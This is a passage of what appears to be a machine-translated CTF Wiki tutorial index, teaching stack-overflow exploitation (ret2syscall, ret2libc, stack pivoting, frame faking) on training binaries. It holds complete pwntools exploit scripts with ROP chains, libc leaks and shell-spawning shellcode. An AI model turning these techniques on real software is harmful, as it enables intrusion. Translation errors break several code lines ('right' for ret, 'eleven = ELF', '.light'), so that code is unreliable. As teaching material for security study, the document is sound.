ret2syscall ROPgadget --binary rop  --string '/bin/sh' \n\nStrings information\n\n============================================================\n\n0x080be408 : /bin/sh\n</code></pre> <p>You can find the corresponding address, in addition, there is an address of int 0x80, as follows</p> <pre><code>\u279c  ret2syscall ROPgadget --binary rop  --only 'int'                 \n\nGadgets information\n\n============================================================\n\n0x08049421 : int 0x80\n\n0x080938fe : int 0xbb\n\n0x080869b5 : int 0xf6\n\n0x0807b4d4 : int 0xfc\n\n\n\nUnique gadgets found: 4\n</code></pre> <p>At the same time, I also found the corresponding address.</p> <p>The following is the corresponding payload, where 0xb is the system call number corresponding to execve.</p> <pre><code>#!/usr/bin/env python\n\nfrom pwn import *\n\n\n\nsh = process (&amp;#39;./ call&amp;#39;)\n\n\npop_eax_ret = 0x080bb196\n\npop_edx_ecx_ebx_ret = 0x0806eb90\nint_0x80 = 0x08049421\n\nbinsh = 0x80be408\npayload = flat(\n\n    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])\n\nsh.sendline(payload)\n\nsh.interactive()\n</code></pre>"},{"location":"pwn/linux/stackoverflow/basic-rop/#title_1","title":"Title","text":""},{"location":"pwn/linux/stackoverflow/basic-rop/#ret2libc","title":"ret2libc","text":""},{"location":"pwn/linux/stackoverflow/basic-rop/#principle_3","title":"Principle","text":"<p>Ret2libc is the function in the execution libc of the control function, usually returning to the plt of a function or the specific position of the function (that is, the content of the got entry corresponding to the function). In general, we will choose to execute system(\"/bin/sh\"), so we need to know the address of the system function.</p>"},{"location":"pwn/linux/stackoverflow/basic-rop/#examples_3","title":"Examples","text":"<p>We give three examples from simple to difficult.</p>"},{"location":"pwn/linux/stackoverflow/basic-rop/#example-1","title":"Example 1","text":"<p>Here we take ret2libc1 in bamboofox as an example.</p> <p>Click to download: ret2libc1</p> <p>First, we can check the security of the program.</p> <pre><code>\u279c  ret2libc1 checksec ret2libc1    \n\n    Arch:     i386-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>The source program is 32-bit and NX protection is turned on. Let's take a look at the program source code to determine the location of the vulnerability.</p> <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)\n\n{\n\n  int v4; // [sp+1Ch] [bp-64h]@1\n\n\n\n  setvbuf(stdout, 0, 2, 0);\n\n  setvbuf(_bss_start, 0, 1, 0);\n\n  puts(\"RET2LIBC &gt;_&lt;\");\n\ngets ((char *) &amp;amp; v4);\n  return 0;\n\n}\n</code></pre> <p>You can see that a stack overflow occurred while executing the gets function. Also, with ropgadget, we can see if /bin/sh exists</p> <pre><code>\u279c  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          \n\nStrings information\n\n============================================================\n\n0x08048720 : /bin/sh\n</code></pre> <p>It does exist, look again to see if there is a system function. It is true that it is found in ida.</p> <p><code>`</code>asm .plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</p> <pre><code>So, we go back directly to it, executing the system function. The corresponding payload is as follows\n\n\n```python\n\n#!/usr/bin/env python\n\nfrom pwn import *\n\n\n\nsh = process('./ret2libc1')\n\n\n\nbinsh_addr = 0x8048720\n\nsystem_plt = 0x08048460\npayload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])\n\nsh.sendline(payload)\n\n\n\nsh.interactive()\n</code></pre> <p>Here we need to pay attention to the structure of the function call stack. If the system function is called normally, we will have a corresponding return address when calling, where 'bbbb' is used as the fake address, and then the parameter content corresponding to the parameter.</p> <p>This example is relatively simple, and provides the address of the system address and /bin/sh, but most programs don't have such a good condition.</p>"},{"location":"pwn/linux/stackoverflow/basic-rop/#example-2","title":"Example 2","text":"<p>Here is an example of ret2libc2 in bamboofox.</p> <p>\u70b9\u51fb\u4e0b\u8f7d: ret2libc2</p> <p>This topic is basically the same as in Example 1, except that the /bin/sh string no longer appears, so we need to read the string ourselves, so we need two gadgets, the first control program reads the string, the first The two control programs execute system(\"/bin/sh\"). Since the vulnerability is consistent with the above, here is not to say more, the specific exp is as follows</p> <pre><code>##!/usr/bin/env python\n\nfrom pwn import *\n\n\n\nsh = process('./ret2libc2')\n\n\n\ngets_plt = 0x08048460\nsystem_plt = 0x08048490\npop_ebx = 0x0804843d\n\nbuf2 = 0x804a080\n\npayload = flat(\n\n    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])\n\nsh.sendline(payload)\n\nsh.sendline('/bin/sh')\n\nsh.interactive()\n</code></pre> <p>Note that I am writing the /bin/sh string to buf2 in the bss section of the program and passing its address as a parameter to system. This is so easy to get the shell.</p>"},{"location":"pwn/linux/stackoverflow/basic-rop/#example-3","title":"Example 3","text":"<p>Here is an example of ret2libc3 in bamboofox.</p> <p>\u70b9\u51fb\u4e0b\u8f7d: ret2libc3</p> <p>On the basis of Example 2, the address of the system function is removed again. At this point, we need to find both the address of the system function and the address of the /bin/sh string. First, check the security</p> <pre><code>\u279c  ret2libc3 checksec ret2libc3\n\n    Arch:     i386-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>As you can see, the source program still has stack unexecutable protection turned on. Looking at the source code, I found that the bug in the program is still a stack overflow.</p> <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)\n\n{\n\n  int v4; // [sp+1Ch] [bp-64h]@1\n\n\n\n  setvbuf(stdout, 0, 2, 0);\n\n  setvbuf(stdin, 0, 1, 0);\n\n  puts(\"No surprise anymore, system disappeard QQ.\");\n\n  printf(\"Can you find it !?\");\n\ngets ((char *) &amp;amp; v4);\n  return 0;\n\n}\n</code></pre> <p>So how do we get the address of the system function? Here mainly use two knowledge points</p> <ul> <li>The system function belongs to libc, and the relative offset between functions in the libc.so dynamic link library is fixed.</li> <li>Even if the program has ASLR protection, it is only random for the middle bits of the address, and the lowest 12 bits will not change. And libc is collected on github, as follows</li> <li>https://github.com/niklasb/libc-database</li> </ul> <p>So if we know the address of a function in libc, then we can determine the libc that the program uses. Then we can know the address of the system function.</p> <p>So how do I get the address of a function in libc? The commonly used method is to use the got table leak, that is, output the contents of the got item corresponding to a function. ** Of course, due to the lazy binding mechanism of libc, we need to leak the address of the function that has been executed. **</p> <p>We can naturally get libc according to the above steps, then query the offset in the program, and then get the system address again, but this manual operation is too many times, a little trouble, here is a libc utilization tool, please refer to the readme for details.</p> <ul> <li>https://github.com/lieanu/LibcSearcher</li> </ul> <p>In addition, after getting libc, there is actually a /bin/sh string in libc, so we can get the address of the /bin/sh string together.</p> <p>Here we leak the address of __libc_start_main because it is where the program was originally executed. Basic use ideas are as follows</p> <ul> <li>Leak __libc_start_main address</li> <li>Get the libc version</li> <li>Get the address of the system address and /bin/sh</li> <li>Execute the source program again</li> <li>Trigger stack overflow execution system('/bin/sh')</li> </ul> <p>Exp is as follows</p> <pre><code>#!/usr/bin/env python\n\nfrom pwn import *\n\nfrom LibcSearcher import LibcSearcher\n\nsh = process('./ret2libc3')\n\n\n\nret2libc3 = ELF('./ret2libc3')\n\n\n\nputs_plt = ret2libc3.plt [&amp;#39;puts&amp;#39;]\nlibc_start_main_got = ret2libc3.got['__libc_start_main']\n\nmain = ret2libc3.symbols['main']\n\n\n\nprint \"leak libc_start_main_got addr and return to main again\"\n\npayload = flat(['A' * 112, puts_plt, main, libc_start_main_got])\n\nsh.sendlineafter('Can you find it !?', payload)\n\n\n\nprint \"get the related addr\"\n\nlibc_start_main_addr = u32(sh.recv()[0:4])\n\nlibc = LibcSearcher('__libc_start_main', libc_start_main_addr)\n\nlibcbase = libc_start_main_addr - libc.dump('__libc_start_main')\n\nsystem_addr = libcbase + libc.dump('system')\n\nbinsh_addr = libcbase + libc.dump('str_bin_sh')\n\n\n\nprint \"get shell\"\n\npayload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])\n\nsh.sendline(payload)\n\n\n\nsh.interactive()\n</code></pre>"},{"location":"pwn/linux/stackoverflow/basic-rop/#title_2","title":"Title","text":"<ul> <li>train.cs.nctu.edu.tw: ret2libc</li> </ul>"},{"location":"pwn/linux/stackoverflow/basic-rop/#topic","title":"topic","text":"<ul> <li>train.cs.nctu.edu.tw: rop</li> <li> <p>2013-PlaidCTF-ropasaurusrex</p> </li> <li> <p>Defcon 2015 Qualifier: R0pbaby</p> </li> </ul>"},{"location":"pwn/linux/stackoverflow/basic-rop/#reference-reading","title":"Reference reading","text":"<ul> <li>[Black Cloud Step by Step ROP (Steamed Rice)] (http://wooyun.jozxing.cc/static/drops/tips-6597.html)</li> <li>[Hands to teach you stack overflow from entry to give up (on)] (https://zhuanlan.zhihu.com/p/25816426)</li> <li>[Hands to teach you stack overflow from entry to give up (below)] (https://zhuanlan.zhihu.com/p/25892385)</li> <li>[ [Technology Sharing] Modern Stack Overflow Utilization Technology Foundation: ROP] (http://bobao.360.cn/learning/detail/3694.html)</li> </ul>"},{"location":"pwn/linux/stackoverflow/fancy-rop/","title":"\u82b1\u5f0f\u6ea2\u6ea2\u6280\u5de7","text":""},{"location":"pwn/linux/stackoverflow/fancy-rop/#stack-pivoting","title":"stack pivoting","text":""},{"location":"pwn/linux/stackoverflow/fancy-rop/#principle","title":"Principle","text":"<p>Stack pivoting, as it describes, the trick is to hijack the stack pointer to the memory that the attacker can control, and then ROP at the appropriate location. In general, we may need to use stack pivoting in the following situations.</p> <ul> <li>The number of bytes that can be controlled by the stack overflow is small, making it difficult to construct a long ROP chain</li> <li>PIE protection is enabled, the stack address is unknown, we can hijack the stack to a known area.</li> <li>Other vulnerabilities are difficult to exploit, we need to convert, for example, hijacking the stack to the heap space, writing rop on the heap and making heap exploits</li> </ul> <p>In addition, there are several requirements for using socket pivoting.</p> <ul> <li> <p>You can control the flow of program execution.</p> </li> <li> <p>You can control the sp pointer. In general, the control stack pointer will use ROP, and the common control stack pointers are usually gadgets.</p> </li> </ul> <p><code>`</code>asm pop rsp/esp</p> <pre><code>Of course, there will be some other postures. For example, gadgets in libc_csu_init, we can get the control rsp pointer by offset. The above is normal, the bottom is offset.\n\n\n`` `asm\ngef\u27a4  x/7i 0x000000000040061a\n\n0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx\n\n0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp\n\n0x40061c &lt;__libc_csu_init+92&gt;:  pop    r12\n\n0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13\n\n0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14\n\n0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15\n\n0x400624 &amp;lt;__ libc_csu_init + 100&amp;gt;: right\ngef\u27a4  x/7i 0x000000000040061d\n\n0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp\n\n0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13\n\n0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14\n\n0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15\n\n0x400624 &amp;lt;__ libc_csu_init + 100&amp;gt;: right\n</code></pre> <p>In addition, there are more advanced fake frames.</p> <ul> <li>There is memory that can control the content, generally as follows</li> <li>bss segment. Since the process allocates memory by page, the memory allocated to the bss segment is at least one page (4k, 0x1000) in size. However, the contents of the general bss section do not use so much space, and the memory pages allocated by the bss section have read and write permissions.</li> <li>heap. But this requires us to be able to reveal the heap address.</li> </ul>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#example","title":"example","text":""},{"location":"pwn/linux/stackoverflow/fancy-rop/#example-1","title":"Example 1","text":"<p>Here we take [X-CTF Quals 2016 - b0verfl0w] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-% 20b0verfl0w) is introduced as an example. First, check the security of the program, as follows</p> <pre><code>\u279c  X-CTF Quals 2016 - b0verfl0w git:(iromise) \u2717 checksec b0verfl0w                 \n\n    Arch:     i386-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX disabled\n\n    PIE:      No PIE (0x8048000)\n\n    RWX:      Has RWX segments\n</code></pre> <p>It can be seen that the source program is 32-bit and NX protection is not enabled. Let's look for the vulnerability of the program.</p> <pre><code>signed int vul()\n\n{\n\n  char s; // [sp+18h] [bp-20h]@1\n\n\n\n  puts(\"\\n======================\");\n\n  puts(\"\\nWelcome to X-CTF 2016!\");\n\n  puts(\"\\n======================\");\n\n  puts(\"What's your name?\");\n\n  fflush(stdout);\n\n  fgets(&amp;s, 50, stdin);\n\n  printf(\"Hello %s.\", &amp;s);\n\n  fflush(stdout);\n\n  return 1;\n\n}\n</code></pre> <p>As you can see, there is a stack overflow vulnerability in the source program. But the only bytes that can overflow are only 50-0x20-4=14 bytes, so it is difficult to implement some better ROPs. Here we consider stack pivoting. Since the program itself does not have stack protection turned on, we can lay out shellcode on the stack and execute it. Basic use ideas are as follows</p> <ul> <li>Layout shellcode with stack overflow</li> <li>Control eip to point to shellcode</li> </ul> <p>The first step is still relatively easy to read directly, but since the program itself will open ASLR protection, it is difficult to directly know the address of the shellcode. But the relative offset on the stack is fixed, so we can use the stack overflow to operate on the esp to point to the shellcode and directly control the program to jump to the esp. The following is to find the control program to jump to the gadgets at the esp.</p> <pre><code>\u279c  X-CTF Quals 2016 - b0verfl0w git:(iromise) \u2717 ROPgadget --binary b0verfl0w --only 'jmp|ret'         \n\nGadgets information\n\n============================================================\n\n0x08048504 : jmp esp\n\n0x0804836a: right\n0x0804847e: right 0xeac1\n\n\nUnique gadgets found: 3\n</code></pre> <p>Here we find that there is a gadget that can jump directly to esp. Then we can lay out the payload as follows</p> <pre><code>shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp\n</code></pre> <p>Then the last part of our payload changes how to set esp, you can know</p> <ul> <li> <p>size(shellcode+padding)=0x20</p> </li> <li> <p>size(fake ebp)=0x4</p> </li> <li> <p>size(0x08048504)=0x4</p> </li> </ul> <p>So the last step we need to execute is</p> <p><code>`</code>asm sub esp,0x28</p> <p>jmp esp</p> <pre><code>So the last exp is as follows\n\n\n```python\n\nfrom pwn import *\n\nsh = process('./b0verfl0w')\n\n\n\nshellcode_x86 = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\"\nshellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\"\n\nshellcode_x86 += \"\\x0b\\xcd\\x80\"\n\n\n\nsub_esp_jmp = asm('sub esp, 0x28;jmp esp')\n\njmp_esp = 0x08048504\n\npayload = shellcode_x86 + (\n\n    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp\n\nsh.sendline(payload)\n\nsh.interactive()\n</code></pre>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#example-2-transfer-heap","title":"Example 2 - Transfer heap","text":"<p>Wait.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#title","title":"Title","text":"<ul> <li>EkoPartyCTF 2016 fuckzing-exploit-200</li> </ul>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#frame-faking","title":"frame faking","text":"<p>As the name suggests, this technique constructs a fake stack frame to control the execution flow of the program.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#principle_1","title":"Principle","text":"<p>In a nutshell, the stack overflow we talked about before is nothing more than two ways.</p> <ul> <li>Control program EIP</li> <li>Control program EBP</li> </ul> <p>It ends up being the execution flow of the control program. In frame faking, the trick we use is to control both EBP and EIP, so that we control the execution flow of the program and also change the position of the stack frame. Generally its payload is as follows</p> <pre><code>buffer padding|fake ebp|leave ret addr|\n</code></pre> <p>That is, we use stack overflow to construct the stack as above. Here we mainly talk about the next two parts</p> <ul> <li>The return address of the function is overwritten by us to execute the address of the leave ret, which indicates that the function will perform a leave ret again after it has successfully executed its own leave ret.</li> <li>where fake ebp is the base address of the stack frame we constructed. Note that this is an address. In general, we construct a fake stack frame as follows</li> </ul> <pre><code>fake ebp\n\n|\n\nv\nebp2|target function addr|leave ret addr|arg1|arg2\n</code></pre> <p>Here our fake ebp points to ebp2, which is the address where ebp2 is located. Generally speaking, this is all readable content that we can control.</p> <p>**The following assembly syntax is the intel syntax. **</p> <p>Before we introduce the basic control process, we still need to talk about the basic operation of the entry and exit points of the function.</p> <p>Entry point</p> <pre><code>Push ebp # push ebp\nMov ebp, esp # assign the value of esp to ebp\n</code></pre> <p>Exit point</p> <pre><code>leave\n\nRet #pop eip, pop the top element of the stack as the next execution address of the program\n</code></pre> <p>Where the leave command is equivalent</p> <pre><code>Mov esp, ebp # assign the value of ebp to esp\nPop ebp # pop ebp\n</code></pre> <p>Let's take a closer look at the basic control process.</p> <ol> <li> <p>When a program with a stack overflow performs leave, it is divided into two steps.</p> </li> <li> <p>mov esp, ebp , which will also point esp to the ebp base address of the current stack overflow vulnerability.</p> </li> <li> <p>pop ebp, which assigns the value of fake ebp stored in the stack to ebp. That is, after executing the instruction, ebp points to ebp2, which is the address where ebp2 is stored.</p> </li> <li> <p>Execute the ret instruction and execute the leave ret instruction again.</p> </li> <li> <p>Execute the leave command, which is divided into two steps</p> </li> <li> <p>mov esp, ebp , which points esp to ebp2.</p> </li> <li> <p>pop ebp, in which case the content of ebp will be set to the value of ebp2, and esp will point to the target function.</p> </li> <li> <p>Execute the ret instruction, at which time the program will execute the target function and execute it when it is running the program.</p> </li> <li> <p>push ebp, which pushes the ebp2 value onto the stack.</p> </li> <li> <p>mov ebp, esp, points ebp to the current base address.</p> </li> </ol> <p>The stack structure at this time is as follows</p> <pre><code>ebp\n\n|\n\nv\nebp2 | leave ret addr | arg1 | arg2\n</code></pre> <ol> <li> <p>When the program is executed, it will apply for space normally. At the same time, we also arrange the parameters corresponding to the function on the stack, so the program will execute normally.</p> </li> <li> <p>After the program ends, it will execute leave ret addr twice, so if we have the corresponding content arranged at ebp2, then we can always control the execution flow of the program.</p> </li> </ol> <p>It can be seen that in the fake frame, we have a requirement that we have to have a memory that can be written, and we also know the address of this memory, which is similar to stack pivoting.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#2018-over","title":"2018 \u5b89\u6052\u676fover","text":"<p>Take the over one of the An Heng Cup monthly competition in June 2018 as an example. The title can be found in [ctf-challenge] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow Found in /fake_frame/over)</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#file-information","title":"File Information","text":"<pre><code>over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped\n\n[*] '/home/m4x/pwn_repo/others_over/over.over'\n\n    Arch:     amd64-64-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\nFOOT: No FOOT\n</code></pre> <p>64-bit dynamically linked program, without PIE and canary protection, but opened NX protection</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#_2","title":"\u5206\u6790\u7a0b\u5e8f","text":"<p>Put it in IDA for analysis <pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n\n{\n\n  setvbuf(stdin, 0LL, 2, 0LL);\n\n  setvbuf(stdout, 0LL, 2, 0LL);\n\n  while ( sub_400676() )\n\n    ;\n\n  return 0LL;\n\n}\n\n\n\nint sub_400676()\n\n{\n\n  char buf[80]; // [rsp+0h] [rbp-50h]\n\n\n\n  memset(buf, 0, sizeof(buf));\n\n  putchar('&gt;');\n\n  read(0, buf, 96uLL);\n\n  return puts(buf);\n\n}\n</code></pre></p> <p>The vulnerability is obvious, read can read 96 bits, but the length of buf is only 80, so it can cover rbp and ret addr but can only cover rbp and ret addr, so it can only be controlled by controlling rbp and ret addr at the same time. Up</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#leak-stack","title":"leak stack","text":"<p>In order to control rbp, we need to know some addresses. We can find that when the input length is 80, since read does not add '\\0' to the end of the input, the value of rbp will be printed by puts, so that we can Know the address of all locations on the stack by a fixed offset <pre><code>Breakpoint 1, 0x00000000004006b9 in ?? ()\n\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n RAX  0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ('00000000')\n\n RBX  0x0\n\n RCX  0x7ff756e9b690 (__read_nocancel+7) \u25c2\u2014 cmp    rax, -0xfff\n\n RDX  0x60\n\n RDI  0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ('00000000')\n\n RSI  0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ('00000000')\n\n R8   0x7ff75715b760 (_IO_stdfile_1_lock) \u25c2\u2014 0x0\n\nR9 0x7ff757354700 \u25c2- 0x7ff757354700\n R10  0x37b\n\n R11  0x246\n\n R12  0x400580 \u25c2\u2014 xor    ebp, ebp\n\n R13  0x7ffceaf112b0 \u25c2\u2014 0x1\n\n R14  0x0\n\n R15  0x0\n\n RBP  0x7ffceaf111b0 \u2014\u25b8 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push   r15\n\n RSP  0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ('00000000')\n\n RIP  0x4006b9 \u25c2\u2014 call   0x400530\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500 [DISASM] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x4006b9    call   puts@plt &lt;0x400530&gt;\n\n        s: 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ('00000000')\n\n\n\n   0x4006be    leave\n\n0x4006bf right\n\n\n   0x4006c0    push   rbp\n\n   0x4006c1    mov    rbp, rsp\n\n   0x4006c4    sub    rsp, 0x10\n\n0x4006c8 mov dword ptr [rbp - 4], edi\n0x4006cb mov qword for [rbp - 0x10], rsi\n   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] &lt;0x601060&gt;\n\n0x4006d6 mov ecx, 0\n   0x4006db    mov    edx, 2\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n00:0000\u2502 rax rdi rsi rsp  0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ('00000000')\n\n... \u2193\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n \u25ba f 0           4006b9\n\n   f 1           400715\n\n   f 2     7ff756de02b1 __libc_start_main+241\n\nBreakpoint *0x4006B9\n\npwndbg&gt; stack 15\n\n00:0000\u2502 rax rdi rsi rsp  0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ('00000000')\n\n... \u2193\n\n0a:0050\u2502 rbp              0x7ffceaf111b0 \u2014\u25b8 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push   r15\n\n0b:0058\u2502                  0x7ffceaf111b8 \u2014\u25b8 0x400715 \u25c2\u2014 test   eax, eax\n\n0c:0060\u2502                  0x7ffceaf111c0 \u2014\u25b8 0x7ffceaf112b8 \u2014\u25b8 0x7ffceaf133db \u25c2\u2014 './over.over'\n\n0d:0068\u2502                  0x7ffceaf111c8 \u25c2\u2014 0x100000000\n\n0e:0070\u2502                  0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push   r15\n\npwndbg&gt; distance 0x7ffceaf111d0 0x7ffceaf11160\n\n0x7ffceaf111d0-&gt;0x7ffceaf11160 is -0x70 bytes (-0xe words)\n</code></pre></p> <p>After leaking the stack address, we can control the program flow by controlling rbp as the address on the stack (such as 0x7ffceaf11160) and ret addr as the address of leave ret.</p> <p>For example, we can fill in the rop chain of the leak libc at 0x7ffceaf11160 + 0x8 and control it back to the <code>sub_400676</code> function to leak libc. \u200b    </p> <p>Then on the next use, you can use the rop to execute <code>system(&amp;quot;/bin/sh&amp;quot;)</code> or <code>execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)</code> to get the shell. This question is because the input is long enough. , we can arrange the use chain of <code>execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)</code>, this method is more secure (<code>system(&amp;quot;/bin/sh&amp;quot;)</code> may be invalidated due to env destruction) , but because the structure of the stack changes during the process, some key offsets need to be determined by debugging.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#exp","title":"exp","text":"<pre><code>from pwn import *\n\ncontext.binary = \"./over.over\"\n\n\n\ndef DEBUG(cmd):\n\n    raw_input(\"DEBUG: \")\n\n    gdb.attach(io, cmd)\n\n\n\nio = process(\"./over.over\")\n\neleven = ELF (&amp;quot;./over.over&amp;quot;)\nlibc = elf.libc\n\n\n\nio.sendafter(\"&gt;\", 'a' * 80)\n\nstack = u64 (io.recvuntil (&amp;quot;x7f&amp;quot;) [- 6:] .light (8, &amp;#39;0&amp;#39;)) - 0x70\nsuccess(\"stack -&gt; {:#x}\".format(stack))\n\n\n\n\n\n#  DEBUG(\"b *0x4006B9\\nc\")\n\nio.sendafter(\"&gt;\", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))\n\nlibc.address = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - libc.sym['puts']\n\nsuccess(\"libc.address -&gt; {:#x}\".format(libc.address))\n\n\n\npop_rdi_ret = 0x400793\n'''\n\n$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;quot;pop | ret&amp;quot;\n0x00000000000f5279 : pop rdx ; pop rsi ; ret\n\n'''\n\npop_rdx_pop_rsi_ret=libc.address+0xf5279\n\n\n\n\n\npayload=flat(['22222222', pop_rdi_ret, next(libc.search(\"/bin/sh\")),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym['execve'], (80 - 7*8 ) * '2', stack - 0x30, 0x4006be])\n\n\n\nio.sendafter(\"&gt;\", payload)\n\n\n\nio.interactive ()\n</code></pre> <p>In general, this method is not very different from the stack pivot.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#reference-reading","title":"Reference reading","text":"<ul> <li> <p>http://www.xfocus.net/articles/200602/851.html</p> </li> <li> <p>http://phrack.org/issues/58/4.html</p> </li> </ul>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#stack-smash","title":"Stack 